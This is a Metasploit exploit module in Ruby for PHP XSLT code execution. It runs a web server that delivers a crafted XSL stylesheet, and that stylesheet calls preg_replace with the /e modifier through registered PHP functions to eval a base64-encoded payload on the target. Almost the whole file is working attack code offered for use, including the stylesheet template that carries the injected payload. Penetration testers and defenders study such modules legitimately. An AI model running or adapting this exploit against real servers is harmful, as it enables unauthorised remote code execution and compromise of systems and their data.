##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Generic XSLT+PHP Code Execution',
			'Description'    => %q{
				This module exploits a feature in the PHP XSLT engine when
				RegisterPhpFunctions is called. This is a feature and will
				not be patched.
			},
			'Author'	=> 
				[
					'Nicolas "Nicob" Gregoire',	# This code
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://xhe.myxwiki.org/xwiki/bin/view/XSLT/Application_PHP5' ],
				],
			'Privileged'	=> true,
			'Platform'	=> [ 'php' ],
			'Arch'		=> ARCH_PHP,
			'Payload'       => { 'BadChars' => '', 'DisableNops' => true },
			'Stance'	=> Msf::Exploit::Stance::Aggressive,
			'Targets'	=>
				[
					[ 'Automatic',		{ 'foobar' => 0 } ],
				],
			'DisclosureDate' => 'January 16, 2012', # First PoC on my Wiki
			'DefaultTarget'  => 0))
		
	end
	
	def exploit
		app_base = rand_text_alphanumeric(8 + rand(8))
		malicious_url = "http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{app_base}"

		start_service({'Uri' => {
				'Proc' => Proc.new { |cli, req|
					on_request_uri(cli, req, 'XSL')
				},
				'Path' => '/' + app_base + '.xsl'
		}})
		
		# Wait for the data to be sent
		while (not @xsl_sent)
			select(nil, nil, nil, 1)
		end
		
		# Exit	
		print_status("Shutting down the web service...")
		stop_service
		return
		
	end
	
	# Handle incoming requests from the server
	def on_request_uri(cli, request, resource)
		p = regenerate_payload(cli)
		if not p
			print_error("Failed to generate the payload.")
			send_not_found(cli)
			return
		end

		x = load_php_with_xsl(p)
		send_response( cli, x, { 'Content-Type' => "application/octet-stream" } )
		@xsl_sent = true
	end

	# Create the XSLT document running the PHP payload	
	def load_php_with_xsl(payload)
		xsl =  "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\n"
		xsl << "<xsl:template match=\"/\">\n"
		xsl << "<xsl:variable name=\"eval\"><![CDATA[eval(base64_decode('HERE_HERE_HERE'))]]></xsl:variable>\n"
		xsl << "<xsl:variable name=\"preg\" select=\"php:function('preg_replace', '/.*/e', $eval, '')\"/>\n"
		xsl << "</xsl:template></xsl:stylesheet>\n"

		xsl.gsub!(/HERE_HERE_HERE/, Rex::Text.encode_base64(payload.raw))
		xsl
	end
end
